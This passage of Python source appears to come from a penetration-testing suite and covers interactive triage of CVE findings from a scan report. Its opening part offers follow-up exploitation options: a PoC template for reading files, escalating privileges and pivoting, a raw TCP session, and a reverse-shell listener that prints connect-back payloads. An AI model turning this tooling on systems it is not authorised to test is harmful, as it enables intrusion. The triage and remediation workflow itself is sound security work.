                                                         if intensity_of(m) in _INTENSITY_ORDER else 99,
                                                         name_of(m))):
                if "hostport" not in supports(m):
                    continue
                desc = getattr(m, "DESCRIPTION", "")[:50]
                print(f"    {intensity_of(m):<12} {_cc(_CYN, name_of(m)):<35} {desc}")
            print()
            continue

        # c — custom follow-up PoC script
        if choice in ("c", "custom", "script"):
            base = (
                f"# Custom follow-up PoC — {cve_id} foothold @ {host}:{port}\n"
                f"# Edit to read files, escalate privileges, pivot to internal services, etc.\n"
                f"# Print:  RESULT:true:<evidence>  or  RESULT:false:\n"
                f"import socket\n\n"
                f"HOST, PORT = {host!r}, {port}\n\n"
                f"# TODO: implement follow-up attack step\n"
                f"print('RESULT:false:not implemented')\n"
            )
            script = _open_editor(base)
            print()
            print(_cc(_BOLD, "  ── Script output ───────────────────────────────────────────────────"))
            _run_script_operator(script, timeout=90)
            print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
            print()
            continue

        # t — raw TCP session (line mode)
        if choice in ("t", "tcp"):
            _tcp_shell(host, port)
            continue

        # rs — reverse shell listener → raw PTY handoff
        if choice in ("rs", "revshell", "shell", "reverse"):
            if _require_yes_confirm(
                f"Reverse shell listener → catch interactive shell from {host}:{port}",
                "Impact  : Target process connects back and executes as its service account.\n"
                "          Leaves evidence (network connection, spawned process) on target.",
            ):
                lhost, lport = _ask_lhost_lport()
                if lhost:
                    payloads = _reverse_shell_payloads(lhost, lport)
                    print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
                    for tech, cmd in payloads.items():
                        print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
                    print()
                    _reverse_shell_session(lhost, lport)
            continue

        print("  Unknown command — try a number, 'mod <name>', 'list', 'c', 't', 'rs', or 'done'")


# ──────────────────────────────────────── triage session ─────────────────────

_Decisions: Dict[str, dict] = {}


def _fingerprint(module_name: str, f: dict) -> str:
    cve_id = _cve_id_from_finding(f)
    return f"{module_name}|{cve_id or f.get('title','?')}|{f.get('location','?')}"


def _show_menu() -> None:
    print(_cc(_BOLD, "  Actions:"))
    print("    [e]xpand    — full detail, evidence, all references")
    print("    [i]mpact    — re-display impact and data-at-risk analysis")
    print("    [ra] auto   — re-run detection automatically, show full evidence")
    print("    [ri] interac— show PoC, edit in $EDITOR, run & record manual verdict")
    print("    [a]ccept    — confirm as a real finding requiring remediation")
    print("    [f]alse-pos — mark as false positive (add a note)")
    print("    [w]aive     — accept risk (add a justification note)")
    print("    [s]kip      — next finding, no decision recorded")
    print("    [q]uit      — exit triage and save decisions")
    print()


def _ask(prompt: str) -> str:
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        return ""


def run_triage(pairs: List[Tuple[str, dict]], report_path: str, auto_reverify: bool) -> None:
    global _Decisions
    _Decisions = {}
    total = len(pairs)
    i = 0
    while i < total:
        module_name, f = pairs[i]
        display_finding(module_name, f, i + 1, total)

        fp = _fingerprint(module_name, f)
        if fp in _Decisions:
            prev = _Decisions[fp]["disposition"]
            print(_cc(_DIM, f"  (already triaged: {prev})"))
            print()

        if auto_reverify and _cve_id_from_finding(f):
            ans = _ask("  Auto re-verify this finding? [Y/n]: ").lower()
            if ans in ("", "y", "yes"):
                re_verify_auto(module_name, f)

        _show_menu()

        while True:
            choice = _ask("triage [e/i/ra/ri/a/f/w/s/q]: ").lower()

            if choice in ("q", "quit", "exit"):
                return

            if choice in ("s", "skip", "n", "next", ""):
                i += 1
                break

            if choice in ("e", "expand"):
                show_expanded(f)
                continue

            if choice in ("i", "impact"):
                cwe = f.get("cwe") or ""
                if cwe in _CWE_IMPACT:
                    cwe_name, can_do, at_risk = _CWE_IMPACT[cwe]
                    print(f"\n  {_cc(_CYN, cwe)}: {cwe_name}")
                    print(_wrap(can_do, indent="    "))
                    print()
                    print(_cc(_CYN, "  Data / access at risk:"))
                    print(_wrap(at_risk, indent="    "))
                else:
                    print(f"  No detailed impact mapping for {cwe or 'this CWE'}.")
                print()
                continue

            if choice in ("ra", "r", "re-verify", "reverify", "rv"):
                re_verify_auto(module_name, f)
                continue

            if choice in ("ri", "re-verify-interactive", "rinteractive"):
                re_verify_interactive(module_name, f, _Decisions)
                continue

            if choice in ("a", "accept", "confirm"):
                _Decisions[fp] = {
                    "disposition": "accepted",
                    "module": module_name,
                    "cve": _cve_id_from_finding(f),
                    "location": f.get("location") or "",
                    "severity": f.get("severity") or "",
                    "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                    "note": "",
                }
                print(_cc(_RED, "  ✔ Accepted — requires remediation."))
                i += 1
                break

            if choice in ("f", "fp", "false-pos", "false-positive"):
                note = _ask("  Reason (false positive): ")
                _Decisions[fp] = {
                    "disposition": "false-positive",
                    "module": module_name,
                    "cve": _cve_id_from_finding(f),
                    "location": f.get("location") or "",
                    "severity": f.get("severity") or "",
                    "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                    "note": note,
                }
                print(_cc(_GRN, "  ✔ Marked as false positive."))
                i += 1
                break

            if choice in ("w", "waive"):
                note = _ask("  Accepted-risk justification: ")
                _Decisions[fp] = {
                    "disposition": "waived",
                    "module": module_name,
                    "cve": _cve_id_from_finding(f),
                    "location": f.get("location") or "",
                    "severity": f.get("severity") or "",
                    "ts": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                    "note": note,
                }
                print(_cc(_YEL, "  ✔ Waived (accepted risk)."))
                i += 1
                break

            print("  Unknown choice — try: e / i / r / a / f / w / s / q")


def show_summary(pairs: List[Tuple[str, dict]]) -> None:
    total    = len(pairs)
    accepted = sum(1 for v in _Decisions.values() if v["disposition"] == "accepted")
    fp_count = sum(1 for v in _Decisions.values() if v["disposition"] == "false-positive")
    waived   = sum(1 for v in _Decisions.values() if v["disposition"] == "waived")
    skipped  = total - len(_Decisions)

    print()
    print(_cc(_BOLD, _BAR))
    print(_cc(_BOLD, "  TRIAGE SUMMARY"))
    print(_cc(_BOLD, _BAR))
    print(f"  Findings reviewed:    {total}")
    print(f"  Accepted (real):      {_cc(_RED, str(accepted))}")
    print(f"  False positives:      {_cc(_GRN, str(fp_count))}")
    print(f"  Waived (risk-accept): {_cc(_YEL, str(waived))}")
    print(f"  Skipped (undecided):  {skipped}")

    if accepted:
        print()
        print(_cc(_BOLD, "  Accepted findings requiring remediation:"))
        for v in _Decisions.values():
            if v["disposition"] != "accepted":
                continue
            cve  = v.get("cve") or "unknown"
            sev  = (v.get("severity") or "").upper()
            loc  = v.get("location") or ""
            mod  = v.get("module") or ""
            print(f"    {_cs(sev, f'{sev:<8}')} {cve}  @  {loc}  [{mod}]")
    print()


def save_decisions(report_path: str) -> None:
    if not _Decisions:
        return
    out_path = report_path + ".triage.json"
    payload  = {
        "generated_at":  time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "source_report": os.path.abspath(report_path),
        "decisions":     _Decisions,
    }
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2)
    print(f"Triage decisions saved → {out_path}")


# ──────────────────────────────────────── entry point ────────────────────────

def main() -> None:
    ap = argparse.ArgumentParser(
        description="Interactive post-scan CVE findings triage",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    ap.add_argument("report", help="JSON report file produced by security_test")
    ap.add_argument(
        "--all", action="store_true",
        help="Triage all exploited findings, not just CVE-tagged ones",
    )
    ap.add_argument(
        "--severity", default="INFO", metavar="SEV",
        help="Minimum severity to include: CRITICAL/HIGH/MEDIUM/LOW/INFO (default: INFO)",
    )
    ap.add_argument(
        "--re-verify", action="store_true",
        help="Automatically prompt to re-run detection for each CVE finding",
    )
    ap.add_argument(
        "--no-color", action="store_true",
        help="Disable ANSI colour output",
    )
    args = ap.parse_args()

    global _USE_COLOR
    if args.no_color or not sys.stdout.isatty():
        _USE_COLOR = False

    try:
        report = load_report(args.report)
    except (OSError, json.JSONDecodeError) as exc:
        print(f"Error loading report: {exc}", file=sys.stderr)
        sys.exit(2)

    modules   = report.get("modules") or []
    target    = report.get("target") or "unknown"
    generated = report.get("generated_at") or ""

    cve_only = not args.all
    pairs    = extract_findings(modules, cve_only, args.severity)

    if not pairs:
        kind = "CVE " if cve_only else ""
        print(f"No {kind}findings at or above {args.severity} severity in the report.")
        sys.exit(0)

    print()
    print(_cc(_BOLD, _BAR))
    print(_cc(_BOLD, "  SECURITY_TEST — INTERACTIVE CVE FINDINGS TRIAGE"))
    print(_cc(_BOLD, _BAR))
    print(f"  Report:    {args.report}")
    print(f"  Target:    {target}")
    print(f"  Generated: {generated}")
    print(f"  Findings:  {len(pairs)} {'CVE ' if cve_only else ''}finding(s) to review "
          f"(severity ≥ {args.severity})")
    print()
    print("  For each finding you can inspect the full impact, re-verify detection")
    print("  against the live target, and record an accept / false-positive / waive")
    print("  decision. Decisions are saved as <report>.triage.json on exit.")
    print()
    try:
        input("  Press Enter to begin, Ctrl-C to abort … ")
    except (EOFError, KeyboardInterrupt):
        sys.exit(0)

    try:
        run_triage(pairs, args.report, args.re_verify)
    except KeyboardInterrupt:
        print("\n\n  [Interrupted]")

    show_summary(pairs)
    save_decisions(args.report)


if __name__ == "__main__":
    main()
